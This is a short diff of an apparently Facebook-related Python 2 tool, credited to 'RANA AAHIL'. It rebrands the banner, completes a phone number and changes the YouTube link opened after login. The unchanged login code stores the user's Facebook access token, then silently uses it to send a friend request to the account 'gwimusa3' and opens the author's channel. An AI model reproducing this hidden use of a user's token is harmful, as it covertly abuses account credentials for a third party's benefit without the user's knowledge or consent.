@@ -55,11 +55,11 @@ logo = """
 
 
                                    
-\033[1;31;40m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅๑۩🅕🅑🅦۩๑▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
+\033[1;31;40m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅๑۩🅡🅐🅡۩๑▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
 \033[1;32;40m ➣Author©  → RANA AAHIL
 \033[1;33;40m ➣Github   → https://github.com/TheAahil
 \033[1;34;40m ➣Youtube  → AAHIL CREATIONS
-\033[1;35;40m ➣☏        → +920315
+\033[1;35;40m ➣☏        → +920315786786
 \033[1;36;40m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
 """
 
@@ -136,7 +136,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCKQ85sgFrddygumAGP8b5pQ')
+				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
